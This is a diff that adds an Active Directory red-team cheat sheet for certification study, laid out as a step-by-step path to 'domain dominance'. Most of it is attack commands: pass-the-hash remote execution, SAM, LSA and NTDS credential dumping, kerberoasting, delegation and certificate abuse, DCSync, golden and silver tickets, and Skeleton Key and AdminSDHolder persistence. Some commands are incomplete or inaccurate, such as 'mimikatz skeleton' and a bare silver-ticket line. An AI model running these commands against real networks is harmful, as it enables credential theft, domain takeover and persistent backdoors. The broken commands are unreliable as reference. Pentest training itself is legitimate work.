@@ -1,0 +1,286 @@
+Active Directory Red Team Command Reference 
+
+Scope: Advanced AD Attacks
+Focus: Red Team / OSCP / CRTP / CRTE
+
+Goal: Domain Dominance
+
+1. Impacket Command Reference
+
+Impacket is one of the most important toolkits for Active Directory attacks.
+
+Repo:
+
+https://github.com/fortra/impacket
+SMB Enumeration
+smbclient.py domain/user:password@target
+
+Anonymous
+
+smbclient.py -no-pass domain/guest@target
+Remote Command Execution
+PSExec
+psexec.py domain/user:password@target
+
+Pass-the-hash
+
+psexec.py domain/user@target -hashes :NTLMHASH
+WMIExec
+wmiexec.py domain/user:password@target
+SMBExec
+smbexec.py domain/user:password@target
+Secretsdump (Credential Dumping)
+
+Dump domain hashes
+
+secretsdump.py domain/user:password@dc-ip
+
+Pass the hash
+
+secretsdump.py domain/user@dc-ip -hashes :HASH
+
+Dump NTDS
+
+secretsdump.py domain/user:password@dc-ip -just-dc
+
+
+2. CrackMapExec / NetExec
+
+CrackMapExec (CME) or NetExec is used for credential validation and lateral movement.
+
+SMB login test
+crackmapexec smb 10.10.10.0/24 -u user -p password
+Pass the hash
+crackmapexec smb 10.10.10.0/24 -u administrator -H HASH
+Dump SAM
+crackmapexec smb target -u user -p password --sam
+Dump LSASS
+crackmapexec smb target -u user -p password --lsa
+
+
+3. Rubeus Commands
+
+Rubeus is used for Kerberos attacks.
+
+Repo:
+
+https://github.com/GhostPack/Rubeus
+Kerberoasting
+Rubeus.exe kerberoast
+
+Save output
+
+Rubeus.exe kerberoast /outfile:hashes.txt
+AS-REP Roasting
+Rubeus.exe asreproast
+Pass the Ticket
+Rubeus.exe ptt /ticket:ticket.kirbi
+Ticket extraction
+Rubeus.exe dump
+Monitor Kerberos tickets
+Rubeus.exe monitor
+
+
+4. BloodHound Useful Queries
+
+BloodHound is used to identify privilege escalation paths.
+
+Find Domain Admin paths
+MATCH (u:User),(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((u)-[*1..]->(g))
+RETURN p
+Find kerberoastable accounts
+MATCH (u:User {hasspn:true})
+RETURN u
+Find users with admin rights
+MATCH (u:User)-[:AdminTo]->(c:Computer)
+RETURN u,c
+Find unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true})
+RETURN c
+
+
+5. Delegation Attacks
+Unconstrained Delegation
+
+Check machines with unconstrained delegation.
+
+Get-DomainComputer -Unconstrained
+
+Extract tickets
+
+Rubeus.exe monitor
+Constrained Delegation
+
+Enumerate delegation
+
+Get-DomainUser -TrustedToAuth
+
+Exploit using Rubeus
+
+Rubeus.exe s4u
+Resource Based Constrained Delegation (RBCD)
+
+Add computer
+
+New-MachineAccount
+
+Configure delegation
+
+Set-ADComputer
+
+Exploit
+
+rbcd.py domain/user:pass
+
+
+6. ADCS Attacks (ESC1–ESC8)
+
+Active Directory Certificate Services misconfigurations can allow privilege escalation.
+
+Find certificate templates
+certipy find
+ESC1 Exploitation
+certipy req -u user@domain.local -p password -template vulnerable_template
+Authenticate with certificate
+certipy auth -pfx certificate.pfx
+
+
+7. Shadow Credentials Attack
+
+Shadow credentials allow attackers to add authentication keys to user objects.
+
+Add shadow credential
+certipy shadow add
+Authenticate
+certipy auth
+
+
+8. DCSync Attack
+
+DCSync allows replication of domain credentials.
+
+Mimikatz
+lsadump::dcsync /domain:domain.local /user:krbtgt
+Impacket
+secretsdump.py domain/user@dc-ip
+
+
+9. Golden Ticket
+
+Requires:
+
+KRBTGT hash
+Domain SID
+Domain name
+
+Create ticket
+
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21 /krbtgt:HASH /ptt
+
+
+10. Silver Ticket
+
+Silver ticket targets specific services.
+
+Example:
+
+Service: CIFS
+
+Command
+
+kerberos::golden /service:cifs
+
+
+11. AdminSDHolder Persistence
+
+Backdoor privileged accounts.
+
+Set-ADObject
+
+
+12. Skeleton Key
+
+Patch Domain Controller authentication.
+
+mimikatz skeleton
+
+
+13. Useful Enumeration Scripts
+PowerView
+Get-DomainUser
+Get-DomainGroup
+Get-DomainComputer
+Get-NetSession
+ADRecon
+ADRecon.ps1
+SharpHound
+SharpHound.exe -c All
+
+
+14. Common Privilege Escalation Paths
+Kerberoasting
+AS-REP Roasting
+Delegation Abuse
+ADCS Misconfiguration
+ACL Abuse
+Credential Dumping
+Password Reuse
+
+
+15. Quick Red Team Attack Flow
+Initial Foothold
+ ↓
+Credential Harvesting
+ ↓
+Domain Enumeration
+ ↓
+Kerberoasting
+ ↓
+BloodHound Analysis
+ ↓
+Privilege Escalation
+ ↓
+Lateral Movement
+ ↓
+DCSync
+ ↓
+Golden Ticket
+
+
+16. Wordlists
+SecLists
+rockyou.txt
+username lists
+domain_users.txt
+
+
+17. Recommended Tools
+Tool	Purpose
+Impacket	Remote execution
+CrackMapExec	Credential attacks
+Rubeus	Kerberos attacks
+BloodHound	AD attack paths
+Mimikatz	Credential dumping
+Certipy	ADCS attacks
+Responder	NTLM capture
+
+
+18. Practice Platforms
+HackTheBox
+TryHackMe
+VulnLab
+ProLabs
+CRTP labs
+
+
+19. Recommended AD Pentesting Learning Path
+1. SMB Enumeration
+2. Password Spraying
+3. LLMNR Attacks
+4. Kerberoasting
+5. BloodHound
+6. Credential Dumping
+7. Delegation Attacks
+8. ADCS Exploitation
+9. DCSync
+10. Golden Ticket
